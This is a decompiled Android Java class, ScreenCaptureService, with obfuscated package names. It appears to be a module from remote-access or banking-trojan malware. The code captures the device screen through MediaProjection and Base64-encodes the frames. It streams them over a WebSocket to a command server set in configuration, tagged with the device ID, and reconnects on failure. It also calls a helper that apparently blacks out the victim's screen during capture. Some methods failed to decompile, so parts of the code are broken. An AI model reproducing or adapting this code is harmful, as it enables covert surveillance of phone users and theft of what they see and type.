/*
 * Decompiled with CFR 0.152.
 * 
 * Could not load the following classes:
 *  android.app.Notification
 *  android.app.Service
 *  android.content.Context
 *  android.content.Intent
 *  android.content.res.Resources
 *  android.graphics.Point
 *  android.hardware.display.VirtualDisplay
 *  android.media.ImageReader
 *  android.media.ImageReader$OnImageAvailableListener
 *  android.media.projection.MediaProjection
 *  android.media.projection.MediaProjection$Callback
 *  android.media.projection.MediaProjectionManager
 *  android.os.Build$VERSION
 *  android.os.Handler
 *  android.os.HandlerThread
 *  android.os.IBinder
 *  android.os.Looper
 *  android.os.Parcelable
 *  android.util.Base64
 *  android.util.Log
 *  android.view.Display
 *  android.view.WindowManager
 *  okhttp3.OkHttpClient
 *  okhttp3.Request
 *  okhttp3.Request$Builder
 *  okhttp3.Response
 *  okhttp3.WebSocket
 *  okhttp3.WebSocketListener
 *  org.json.JSONException
 *  org.json.JSONObject
 */
package linker.resourcer.encoder;

import android.app.Notification;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.res.Resources;
import android.graphics.Point;
import android.hardware.display.VirtualDisplay;
import android.media.ImageReader;
import android.media.projection.MediaProjection;
import android.media.projection.MediaProjectionManager;
import android.os.Build;
import android.os.Handler;
import android.os.HandlerThread;
import android.os.IBinder;
import android.os.Looper;
import android.os.Parcelable;
import android.util.Base64;
import android.util.Log;
import android.view.Display;
import android.view.WindowManager;
import java.lang.ref.WeakReference;
import java.util.ArrayList;
import java.util.List;
import linker.resourcer.encoder.Tools;
import linker.resourcer.encoder.ConfigurationConstants;
import linker.resourcer.encoder.AccessibilityServiceHelper;
import linker.resourcer.encoder.ScreenCaptureService$$ExternalSyntheticLambda0;
import linker.resourcer.encoder.ScreenCaptureService$$ExternalSyntheticLambda1;
import linker.resourcer.encoder.ScreenCaptureService$1$$ExternalSyntheticLambda0;
import linker.resourcer.encoder.ScreenCaptureService$1$$ExternalSyntheticLambda1;
import linker.resourcer.encoder.ScreenCaptureService$1$$ExternalSyntheticLambda2;
import linker.resourcer.encoder.ConfigurationProvider;
import linker.resourcer.encoder.AndroidLogger;
import linker.resourcer.encoder.NotificationBuilder;
import linker.resourcer.encoder.SharedPreferencesManager;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.Response;
import okhttp3.WebSocket;
import okhttp3.WebSocketListener;
import org.json.JSONException;
import org.json.JSONObject;

/*
 * Illegal identifiers - consider using --renameillegalidents true
 */
public class ScreenCaptureService
extends Service {
    private static final String ACTION = "ACTION";
    private static final String DATA = "DATA";
    private static final int MAX_QUEUE_SIZE = 15;
    private static final int MAX_SEND_RETRIES = 5;
    private static final int NOTIFICATION_ID = 111;
    private static final String Qulty = "QULTY";
    private static final String RESTART = "RESTART";
    private static final String RESULT_CODE = "RESULT_CODE";
    private static final String SCREENCAP_NAME = "screencap";
    private static final String START = "START";
    private static final String STOP = "STOP";
    private static final String Sockid = "SOCK";
    private static final String TAG = "iScreenCap";
    private final Object captureRestartLock;
    private OkHttpClient client;
    public String currentrotate = "P";
    private Handler imageReaderHandler;
    private final Object imageReaderLock;
    private HandlerThread imageReaderThread;
    private final List<byte[]> imagesQueue;
    private volatile boolean isAlive = false;
    private boolean isCaptureRestartScheduled = false;
    private String lastOrientation = "P";
    private final Object lockSend = new Object();
    private MediaProjection.Callback mCallBack;
    private Context mContext;
    private int mDensity;
    private Display mDisplay;
    private int mHeight;
    private ImageReader mImageReader;
    private MediaProjection mMediaProjection;
    private VirtualDisplay mVirtualDisplay;
    private int mWidth;
    private volatile boolean orientationWatcherRunning = false;
    private Thread orientationWatcherThread;
    private String pid;
    private int sendRetryCount = 0;
    private WebSocket ws;

    public ScreenCaptureService() {
        this.imagesQueue = new ArrayList<byte[]>();
        this.captureRestartLock = new Object();
        this.imageReaderLock = new Object();
    }

    /*
     * Enabled force condition propagation
     * Lifted jumps to return sites
     */
    private void Livemessage(Context context, String string2, String string3) {
        if (this.ws == null) return;
        String string4 = SharedPreferencesManager.Read(context, "ID", "Deviceid");
        String string5 = SharedPreferencesManager.Read(context, ConfigurationConstants.THE_IDF, null);
        if (!"null".equals(ConfigurationConstants.SCRSIDF)) {
            string5 = ConfigurationConstants.SCRSIDF;
        }
        if (string4 == null || string5 == null) return;
        try {
            String string6 = SharedPreferencesManager.Read(context, ConfigurationConstants.THE_CIP, "null");
            context = new JSONObject();
            context.put("idf", (Object)string5);
            context.put("pid", (Object)string4);
            context.put("itype", (Object)"Slr_client");
            context.put("subc", (Object)"msg");
            context.put("msg", (Object)string2);
            context.put("cip", (Object)string6);
            context.put("conk", (Object)string3);
            this.ws.send(context.toString());
            return;
        }
        catch (JSONException jSONException) {
            jSONException.printStackTrace();
        }
    }

    static /* synthetic */ Object access$000(ScreenCaptureService jcavdzvncdstlcwvoszkepac2) {
        return jcavdzvncdstlcwvoszkepac2.imageReaderLock;
    }

    static /* synthetic */ ImageReader access$102(ScreenCaptureService jcavdzvncdstlcwvoszkepac2, ImageReader imageReader) {
        jcavdzvncdstlcwvoszkepac2.mImageReader = imageReader;
        return imageReader;
    }

    static /* synthetic */ void access$1100(ScreenCaptureService jcavdzvncdstlcwvoszkepac2, Context context, String string2, String string3) {
        jcavdzvncdstlcwvoszkepac2.Livemessage(context, string2, string3);
    }

    static /* synthetic */ VirtualDisplay access$302(ScreenCaptureService jcavdzvncdstlcwvoszkepac2, VirtualDisplay virtualDisplay) {
        jcavdzvncdstlcwvoszkepac2.mVirtualDisplay = virtualDisplay;
        return virtualDisplay;
    }

    static /* synthetic */ boolean access$402(ScreenCaptureService jcavdzvncdstlcwvoszkepac2, boolean bl) {
        jcavdzvncdstlcwvoszkepac2.isAlive = bl;
        return bl;
    }

    static /* synthetic */ int access$502(ScreenCaptureService jcavdzvncdstlcwvoszkepac2, int n) {
        jcavdzvncdstlcwvoszkepac2.mWidth = n;
        return n;
    }

    static /* synthetic */ int access$602(ScreenCaptureService jcavdzvncdstlcwvoszkepac2, int n) {
        jcavdzvncdstlcwvoszkepac2.mHeight = n;
        return n;
    }

    static /* synthetic */ Object access$700(ScreenCaptureService jcavdzvncdstlcwvoszkepac2) {
        return jcavdzvncdstlcwvoszkepac2.lockSend;
    }

    static /* synthetic */ List access$800(ScreenCaptureService jcavdzvncdstlcwvoszkepac2) {
        return jcavdzvncdstlcwvoszkepac2.imagesQueue;
    }

    static /* synthetic */ int access$902(ScreenCaptureService jcavdzvncdstlcwvoszkepac2, int n) {
        jcavdzvncdstlcwvoszkepac2.sendRetryCount = n;
        return n;
    }

    static /* synthetic */ int access$908(ScreenCaptureService jcavdzvncdstlcwvoszkepac2) {
        int n = jcavdzvncdstlcwvoszkepac2.sendRetryCount;
        jcavdzvncdstlcwvoszkepac2.sendRetryCount = n + 1;
        return n;
    }

    /*
     * Enabled aggressive block sorting
     * Enabled unnecessary exception pruning
     * Enabled aggressive exception aggregation
     */
    private void createVirtualDisplay(boolean bl) {
        if (this.mMediaProjection == null) {
            return;
        }
        this.mDisplay = ((WindowManager)this.getSystemService("window")).getDefaultDisplay();
        Object object = new Point();
        this.mDisplay.getRealSize(object);
        int n = object.x;
        int n2 = object.y;
        if (n > 0 && n2 > 0) {
            object = this.imageReaderLock;
            synchronized (object) {
                ImageReader imageReader;
                int n3 = 1;
                if (bl) {
                    n3 = 1000;
                }
                if (this.mVirtualDisplay != null) {
                    this.mVirtualDisplay.release();
                    this.mVirtualDisplay = null;
                }
                if ((imageReader = this.mImageReader) != null) {
                    try {
                        this.mImageReader.setOnImageAvailableListener(null, null);
                        this.mImageReader.close();
                    }
                    catch (Exception exception) {
                        // empty catch block
                    }
                    this.mImageReader = null;
                }
                this.mWidth = n;
                this.mHeight = n2;
                imageReader = new Handler(this.getMainLooper());
                Runnable runnable2 = new Runnable(this){
                    final ScreenCaptureService this$0;
                    {
                        this.this$0 = jcavdzvncdstlcwvoszkepac2;
                    }

                    @Override
                    public void run() {
                        ScreenCaptureService.access$102(this.this$0, ImageReader.newInstance((int)this.this$0.mWidth, (int)this.this$0.mHeight, (int)1, (int)5));
                        this.this$0.ensureImageReaderThread();
                        ScreenCaptureService.access$302(this.this$0, this.this$0.mMediaProjection.createVirtualDisplay(ScreenCaptureService.SCREENCAP_NAME, this.this$0.mWidth, this.this$0.mHeight, this.this$0.mDensity, ScreenCaptureService.getVirtualDisplayFlags(), this.this$0.mImageReader.getSurface(), null, null));
                        this.this$0.mImageReader.setOnImageAvailableListener((ImageReader.OnImageAvailableListener)new ImageAvailableListener(this.this$0), this.this$0.imageReaderHandler);
                    }
                };
                imageReader.postDelayed(runnable2, (long)n3);
                return;
            }
        }
        AndroidLogger.Error(TAG, "createVirtualDisplay: invalid size " + n + "x" + n2);
    }

    private void ensureImageReaderThread() {
        if (this.imageReaderThread == null) {
            this.imageReaderThread = new HandlerThread("ScreenCaptureImageReader");
            this.imageReaderThread.start();
            this.imageReaderHandler = new Handler(this.imageReaderThread.getLooper());
        }
    }

    public static Intent getRestartIntent(Context context) {
        context = new Intent(context, ScreenCaptureService.class);
        context.putExtra(ACTION, RESTART);
        return context;
    }

    public static Intent getStartIntent(Context context, int n, Intent intent, int n2, String string2) {
        context = new Intent(context, ScreenCaptureService.class);
        context.putExtra(ACTION, START);
        context.putExtra(RESULT_CODE, n);
        context.putExtra(DATA, (Parcelable)intent);
        context.putExtra(Qulty, n2);
        context.putExtra(Sockid, string2);
        return context;
    }

    public static Intent getStopIntent(Context context) {
        context = new Intent(context, ScreenCaptureService.class);
        context.putExtra(ACTION, STOP);
        return context;
    }

    private static int getVirtualDisplayFlags() {
        return 18;
    }

    private static boolean isRestartCommand(Intent intent) {
        boolean bl;
        block1: {
            bl = false;
            if (intent == null) {
                return false;
            }
            if (!intent.hasExtra(ACTION) || !RESTART.equals(intent.getStringExtra(ACTION))) break block1;
            bl = true;
        }
        return bl;
    }

    private static boolean isStartCommand(Intent intent) {
        boolean bl;
        block1: {
            bl = false;
            if (intent == null) {
                return false;
            }
            if (!intent.hasExtra(RESULT_CODE) || !intent.hasExtra(DATA) || !intent.hasExtra(ACTION) || !START.equals(intent.getStringExtra(ACTION))) break block1;
            bl = true;
        }
        return bl;
    }

    private static boolean isStopCommand(Intent intent) {
        boolean bl;
        block1: {
            bl = false;
            if (intent == null) {
                return false;
            }
            if (!intent.hasExtra(ACTION) || !STOP.equals(intent.getStringExtra(ACTION))) break block1;
            bl = true;
        }
        return bl;
    }

    /*
     * Enabled aggressive block sorting
     * Enabled unnecessary exception pruning
     * Enabled aggressive exception aggregation
     */
    private void killall() {
        this.stopOrientationWatcher();
        SharedPreferencesManager.WriteBool(this.getApplicationContext(), ConfigurationConstants.Send_Skilton, false);
        this.isAlive = false;
        AccessibilityServiceHelper.BlackScreen(false);
        try {
            if (this.ws != null) {
                this.ws.cancel();
                this.ws = null;
            }
            if (this.client != null) {
                this.client.dispatcher().cancelAll();
                this.client.connectionPool().evictAll();
                this.client.dispatcher().executorService().shutdown();
                this.client = null;
            }
        }
        catch (Exception exception) {
            // empty catch block
        }
        try {
            if (this.mMediaProjection != null) {
                if (this.mCallBack != null) {
                    this.mMediaProjection.unregisterCallback(this.mCallBack);
                    this.mCallBack = null;
                }
                this.mMediaProjection.stop();
                this.mMediaProjection = null;
            }
            if (this.mVirtualDisplay != null) {
                this.mVirtualDisplay.release();
                this.mVirtualDisplay = null;
            }
            if (this.mImageReader != null) {
                this.mImageReader.setOnImageAvailableListener(null, null);
                this.mImageReader.close();
                this.mImageReader = null;
            }
            this.stopImageReaderThread();
        }
        catch (Exception exception) {
            // empty catch block
        }
        Object object = this.lockSend;
        synchronized (object) {
            this.imagesQueue.clear();
        }
        this.mDisplay = null;
        this.mContext = null;
        try {
            this.stopForeground(false);
            this.stopSelf();
            return;
        }
        catch (Exception exception) {
            // empty catch block
        }
    }

    /*
     * WARNING - Removed back jump from a try to a catch block - possible behaviour change.
     * Enabled aggressive block sorting
     * Enabled unnecessary exception pruning
     * Enabled aggressive exception aggregation
     */
    private void restartCapture() {
        block7: {
            Object object;
            try {
                if (this.mMediaProjection == null || !this.isAlive) break block7;
                object = this.captureRestartLock;
                synchronized (object) {
                    if (!this.isCaptureRestartScheduled) break block8;
                }
            }
            catch (Exception exception) {
                AndroidLogger.Error(TAG, "restartCapture exception: " + Log.getStackTraceString((Throwable)exception));
                return;
            }
            {
                block8: {
                    AndroidLogger.Debug(TAG, "restartCapture: already scheduled, skipping");
                    return;
                }
                this.isCaptureRestartScheduled = true;
            }
            {
                object = new Handler(Looper.getMainLooper());
                ScreenCaptureService$$ExternalSyntheticLambda1 ScreenCaptureService$$ExternalSyntheticLambda1 = new ScreenCaptureService$$ExternalSyntheticLambda1(this);
                object.postDelayed((Runnable)ScreenCaptureService$$ExternalSyntheticLambda1, 1500L);
                return;
            }
        }
        AndroidLogger.Error(TAG, "restartCapture: projection null or service not alive");
    }

    private void startForegroundNotification(Context context) {
        try {
            context = NotificationBuilder.getInstance(context).createNotification(context);
            if (Build.VERSION.SDK_INT >= 34) {
                this.startForeground(111, (Notification)context, 32);
            } else {
                this.startForeground(111, (Notification)context);
            }
        }
        catch (Exception exception) {
            // empty catch block
        }
    }

    private void startOrientationWatcher(Context context) {
        if (this.orientationWatcherRunning) {
            return;
        }
        this.orientationWatcherRunning = true;
        this.orientationWatcherThread = new Thread(new ScreenCaptureService$$ExternalSyntheticLambda0(this, context));
        this.orientationWatcherThread.setPriority(1);
        this.orientationWatcherThread.start();
    }

    private void startProjection(int n, Intent intent) {
        this.lastOrientation = Tools.getOrientationString(this.getApplicationContext());
        this.startOrientationWatcher(this.getApplicationContext());
        this.mMediaProjection = ((MediaProjectionManager)this.getSystemService("media_projection")).getMediaProjection(n, intent);
        if (this.mMediaProjection != null) {
            this.mDensity = Resources.getSystem().getDisplayMetrics().densityDpi;
            this.createVirtualDisplay(false);
            this.mCallBack = new SafeProjectionCallback(this);
            this.mMediaProjection.registerCallback(this.mCallBack, null);
        }
    }

    private void startSendThread(Context context) {
        this.isAlive = true;
        if (this.client == null) {
            this.client = new OkHttpClient();
        }
        Request request = new Request.Builder().url(ConfigurationConstants.URL_SOCKT()).build();
        this.ws = this.client.newWebSocket(request, new WebSocketListener(this, context){
            final ScreenCaptureService this$0;
            final Context val$ctx;
            {
                this.this$0 = jcavdzvncdstlcwvoszkepac2;
                this.val$ctx = context;
            }

            /* synthetic */ void lambda$onClosing$0$com-icontrol-protector-ScreenCaptureService$1(Context context) {
                this.this$0.startSendThread(context);
            }

            /* synthetic */ void lambda$onFailure$1$com-icontrol-protector-ScreenCaptureService$1(Context context) {
                this.this$0.startSendThread(context);
            }

            /*
             * WARNING - Removed back jump from a try to a catch block - possible behaviour change.
             * Unable to fully structure code
             * Enabled aggressive block sorting
             * Enabled unnecessary exception pruning
             * Enabled aggressive exception aggregation
             */
            /* synthetic */ void lambda$onOpen$2$com-icontrol-protector-ScreenCaptureService$1(Context var1_1) {
                block17: {
                    block15: {
                        try {
                            var4_3 = SharedPreferencesManager.Read(var1_1, "red_k", ConfigurationProvider.CONS_KY);
lbl3:
                            // 3 sources

                            while (var2_4 = ScreenCaptureService.access$400(this.this$0)) {
                                var3_5 /* !! */  = null;
                                break block15;
                            }
                            return;
                        }
                        catch (Exception var1_2) {
                            var1_2.printStackTrace();
                            return;
                        }
                    }
                    try {
                        var5_10 = ScreenCaptureService.access$700(this.this$0);
                        synchronized (var5_10) {
                            if (ScreenCaptureService.access$800(this.this$0).isEmpty()) break block16;
                        }
                    }
                    catch (OutOfMemoryError var3_7) {
                    }
                    catch (Exception var3_8) {
                        // empty catch block
                        break block17;
                    }
                    {
                        block16: {
                            var3_5 /* !! */  = (byte[])ScreenCaptureService.access$800(this.this$0).remove(0);
                        }
                        ** if (var3_5 /* !! */  == null) goto lbl46
                    }
lbl-1000:
                    // 1 sources

                    {
                        try {
                            var5_10 = Base64.encodeToString((byte[])var3_5 /* !! */ , (int)0);
                            var3_5 /* !! */  = (byte[])new JSONObject;
                            var3_5 /* !! */ ();
                            var3_5 /* !! */ .put("type", (Object)"screen");
                            var3_5 /* !! */ .put("img", var5_10);
                            var3_5 /* !! */ .put("frmt", (Object)"w");
                            var3_5 /* !! */ .put("skly", (Object)"0");
                            var3_5 /* !! */ .put("ori", (Object)this.this$0.currentrotate);
                            var3_5 /* !! */ .put("wmob", ScreenCaptureService.access$500(this.this$0));
                            var3_5 /* !! */ .put("hmob", ScreenCaptureService.access$600(this.this$0));
                            var3_5 /* !! */  = (byte[])var3_5 /* !! */ .toString();
                            ScreenCaptureService.access$1100(this.this$0, var1_1, (String)var3_5 /* !! */ , var4_3);
                        }
                        catch (Exception var3_6) {}
                    }
                }
                try {
                    Thread.sleep(1L);
                }
                catch (InterruptedException var3_9) {}
                ** GOTO lbl3
            }

            public void onClosing(WebSocket webSocket, int n, String string2) {
                super.onClosing(webSocket, n, string2);
                AndroidLogger.Debug(ScreenCaptureService.TAG, "WebSocket closing: " + string2);
                if (this.this$0.isAlive) {
                    ScreenCaptureService.access$402(this.this$0, false);
                    if (this.this$0.sendRetryCount < 5) {
                        ScreenCaptureService.access$908(this.this$0);
                        new Handler(Looper.getMainLooper()).postDelayed((Runnable)new ScreenCaptureService$1$$ExternalSyntheticLambda2(this, this.val$ctx), 3000L);
                    } else {
                        AndroidLogger.Error(ScreenCaptureService.TAG, "Max WebSocket retries reached, not reconnecting");
                        this.this$0.killall();
                    }
                }
            }

            public void onFailure(WebSocket webSocket, Throwable throwable, Response response) {
                super.onFailure(webSocket, throwable, response);
                AndroidLogger.Error(ScreenCaptureService.TAG, "WebSocket failure: " + throwable.getMessage());
                if (this.this$0.isAlive) {
                    ScreenCaptureService.access$402(this.this$0, false);
                    if (this.this$0.sendRetryCount < 5) {
                        ScreenCaptureService.access$908(this.this$0);
                        new Handler(Looper.getMainLooper()).postDelayed((Runnable)new ScreenCaptureService$1$$ExternalSyntheticLambda1(this, this.val$ctx), 3000L);
                    } else {
                        AndroidLogger.Error(ScreenCaptureService.TAG, "Max WebSocket retries reached, not reconnecting");
                        this.this$0.killall();
                    }
                }
            }

            public void onMessage(WebSocket object, String string2) {
                super.onMessage((WebSocket)object, string2);
                try {
                    object = new JSONObject(string2);
                    object = object.optString("type", "empty");
                    if (((String)object).equals("stop") || ((String)object).equals("Unauthorized access")) {
                        this.this$0.killall();
                    }
                }
                catch (Exception exception) {
                    // empty catch block
                }
            }

            public void onOpen(WebSocket webSocket, Response response) {
                super.onOpen(webSocket, response);
                AndroidLogger.Debug(ScreenCaptureService.TAG, "WebSocket opened");
                ScreenCaptureService.access$902(this.this$0, 0);
                new Thread(new ScreenCaptureService$1$$ExternalSyntheticLambda0(this, this.val$ctx)).start();
            }
        });
    }

    private void stopImageReaderThread() {
        if (this.imageReaderThread != null) {
            this.imageReaderThread.quitSafely();
            try {
                this.imageReaderThread.join();
            }
            catch (InterruptedException interruptedException) {
                // empty catch block
            }
            this.imageReaderThread = null;
            this.imageReaderHandler = null;
        }
    }

    private void stopOrientationWatcher() {
        this.orientationWatcherRunning = false;
        if (this.orientationWatcherThread != null) {
            this.orientationWatcherThread.interrupt();
            this.orientationWatcherThread = null;
        }
    }

    private void stopProjection() {
        this.stopOrientationWatcher();
        this.isAlive = false;
        SharedPreferencesManager.WriteBool(this.getApplicationContext(), ConfigurationConstants.Send_Skilton, false);
        AccessibilityServiceHelper.BlackScreen(false);
        if (this.ws != null) {
            this.ws.close(1000, "Closing Screen");
        }
    }

    /*
     * WARNING - Removed back jump from a try to a catch block - possible behaviour change.
     * Loose catch block
     * Enabled aggressive block sorting
     * Enabled unnecessary exception pruning
     * Enabled aggressive exception aggregation
     * Converted monitor instructions to comments
     * Lifted jumps to return sites
     */
    /* synthetic */ void lambda$restartCapture$0$com-icontrol-protector-ScreenCaptureService() {
        Throwable throwable22;
        block15: {
            block14: {
                if (this.mMediaProjection == null || !this.isAlive) break block14;
                this.createVirtualDisplay(true);
                StringBuilder stringBuilder = new StringBuilder();
                AndroidLogger.Debug(TAG, stringBuilder.append("restartCapture: capture restarted, size = ").append(this.mWidth).append("x").append(this.mHeight).toString());
                Object object = this.captureRestartLock;
                // MONITORENTER : object
                this.isCaptureRestartScheduled = false;
                // MONITOREXIT : object
                return;
            }
            AndroidLogger.Error(TAG, "restartCapture(delayed): projection null or service not alive");
            Object object = this.captureRestartLock;
            this.isCaptureRestartScheduled = false;
            // MONITOREXIT : object
            return;
            {
                catch (Throwable throwable22) {
                    break block15;
                }
                catch (Exception exception) {}
                {
                    StringBuilder stringBuilder = new StringBuilder();
                    AndroidLogger.Error(TAG, stringBuilder.append("restartCapture(delayed) exception: ").append(Log.getStackTraceString((Throwable)exception)).toString());
                    Object object2 = this.captureRestartLock;
                }
                // MONITORENTER : object2
                this.isCaptureRestartScheduled = false;
                // MONITOREXIT : object2
            }
            return;
        }
        Object object = this.captureRestartLock;
        // MONITORENTER : object
        this.isCaptureRestartScheduled = false;
        // MONITOREXIT : object
        throw throwable22;
    }

    /* synthetic */ void lambda$startOrientationWatcher$1$com-icontrol-protector-ScreenCaptureService(Context context) {
        while (this.orientationWatcherRunning) {
            try {
                String string2;
                this.currentrotate = string2 = Tools.getOrientationString(context);
                if (!string2.equals(this.lastOrientation)) {
                    StringBuilder stringBuilder = new StringBuilder();
                    AndroidLogger.Debug(TAG, stringBuilder.append("Orientation changed: ").append(this.lastOrientation).append(" -> ").append(string2).toString());
                    this.lastOrientation = string2;
                    this.restartCapture();
                }
                Thread.sleep(2000L);
            }
            catch (Exception exception) {}
        }
    }

    public IBinder onBind(Intent intent) {
        return null;
    }

    public void onCreate() {
        super.onCreate();
        this.mContext = this.getApplicationContext();
    }

    /*
     * WARNING - Removed back jump from a try to a catch block - possible behaviour change.
     * Enabled aggressive block sorting
     * Enabled unnecessary exception pruning
     * Enabled aggressive exception aggregation
     */
    public int onStartCommand(Intent object, int n, int n2) {
        block9: {
            block10: {
                Intent intent;
                Context context;
                try {
                    if (Build.VERSION.SDK_INT >= 26) {
                        this.startForegroundNotification(this.getApplicationContext());
                    }
                    this.mContext = this.getApplicationContext();
                    if (!ScreenCaptureService.isStartCommand(object)) break block9;
                    ConfigurationConstants.SCRQuality = object.getIntExtra(Qulty, 50);
                    ConfigurationConstants.SCRSIDF = object.getStringExtra(Sockid);
                    context = this.getApplicationContext();
                    this.pid = SharedPreferencesManager.Read(context, "ID", "null");
                    if (this.pid == null || "null".equals(this.pid)) break block10;
                    n = object.getIntExtra(RESULT_CODE, 0);
                    intent = (Intent)object.getParcelableExtra(DATA);
                    object = this.lockSend;
                    synchronized (object) {
                        this.imagesQueue.clear();
                    }
                }
                catch (Exception exception) {
                    exception.printStackTrace();
                    return 2;
                }
                {
                    this.startSendThread(context);
                    this.startProjection(n, intent);
                    return 2;
                }
            }
            AndroidLogger.Error("At.start.ScreenCap", "Can't find Device id");
            this.stopProjection();
            this.stopSelf();
            return 2;
        }
        if (ScreenCaptureService.isRestartCommand(object)) {
            this.restartCapture();
            return 2;
        }
        if (!ScreenCaptureService.isStopCommand(object)) return 2;
        this.isAlive = false;
        SharedPreferencesManager.WriteBool(this.getApplicationContext(), ConfigurationConstants.Send_Skilton, false);
        AccessibilityServiceHelper.BlackScreen(false);
        this.stopProjection();
        this.killall();
        return 2;
    }

    private final class ImageAvailableListener
    implements ImageReader.OnImageAvailableListener {
        final ScreenCaptureService this$0;

        private ImageAvailableListener(ScreenCaptureService jcavdzvncdstlcwvoszkepac2) {
            this.this$0 = jcavdzvncdstlcwvoszkepac2;
        }

        /*
         * Exception decompiling
         */
        public void onImageAvailable(ImageReader var1_1) {
            /*
             * This method has failed to decompile.  When submitting a bug report, please provide this stack trace, and (if you hold appropriate legal rights) the relevant class file.
             * 
             * org.benf.cfr.reader.util.ConfusedCFRException: Back jump on a try block [egrp 50[TRYBLOCK] [132 : 2415->2418)] java.lang.Throwable
             *     at org.benf.cfr.reader.bytecode.analysis.opgraph.Op02WithProcessedDataAndRefs.insertExceptionBlocks(Op02WithProcessedDataAndRefs.java:2283)
             *     at org.benf.cfr.reader.bytecode.CodeAnalyser.getAnalysisInner(CodeAnalyser.java:415)
             *     at org.benf.cfr.reader.bytecode.CodeAnalyser.getAnalysisOrWrapFail(CodeAnalyser.java:278)
             *     at org.benf.cfr.reader.bytecode.CodeAnalyser.getAnalysis(CodeAnalyser.java:201)
             *     at org.benf.cfr.reader.entities.attributes.AttributeCode.analyse(AttributeCode.java:94)
             *     at org.benf.cfr.reader.entities.Method.analyse(Method.java:531)
             *     at org.benf.cfr.reader.entities.ClassFile.analyseMid(ClassFile.java:1055)
             *     at org.benf.cfr.reader.entities.ClassFile.analyseInnerClassesPass1(ClassFile.java:923)
             *     at org.benf.cfr.reader.entities.ClassFile.analyseMid(ClassFile.java:1035)
             *     at org.benf.cfr.reader.entities.ClassFile.analyseTop(ClassFile.java:942)
             *     at org.benf.cfr.reader.Driver.doJarVersionTypes(Driver.java:257)
             *     at org.benf.cfr.reader.Driver.doJar(Driver.java:139)
             *     at org.benf.cfr.reader.CfrDriverImpl.analyse(CfrDriverImpl.java:76)
             *     at org.benf.cfr.reader.Main.main(Main.java:54)
             */
            throw new IllegalStateException("Decompilation failed");
        }
    }

    private static class SafeProjectionCallback
    extends MediaProjection.Callback {
        private final WeakReference<ScreenCaptureService> serviceRef;

        SafeProjectionCallback(ScreenCaptureService jcavdzvncdstlcwvoszkepac2) {
            this.serviceRef = new WeakReference<ScreenCaptureService>(jcavdzvncdstlcwvoszkepac2);
        }

        public void onStop() {
            ScreenCaptureService jcavdzvncdstlcwvoszkepac2 = (ScreenCaptureService)((Object)this.serviceRef.get());
            if (jcavdzvncdstlcwvoszkepac2 != null) {
                try {
                    if (jcavdzvncdstlcwvoszkepac2.mVirtualDisplay != null) {
                        jcavdzvncdstlcwvoszkepac2.mVirtualDisplay.release();
                        ScreenCaptureService.access$302(jcavdzvncdstlcwvoszkepac2, null);
                    }
                    if (jcavdzvncdstlcwvoszkepac2.mImageReader != null) {
                        jcavdzvncdstlcwvoszkepac2.mImageReader.setOnImageAvailableListener(null, null);
                        jcavdzvncdstlcwvoszkepac2.mImageReader.close();
                        ScreenCaptureService.access$102(jcavdzvncdstlcwvoszkepac2, null);
                    }
                    jcavdzvncdstlcwvoszkepac2.stopImageReaderThread();
                }
                catch (Exception exception) {
                    exception.printStackTrace();
                }
            }
        }
    }
}

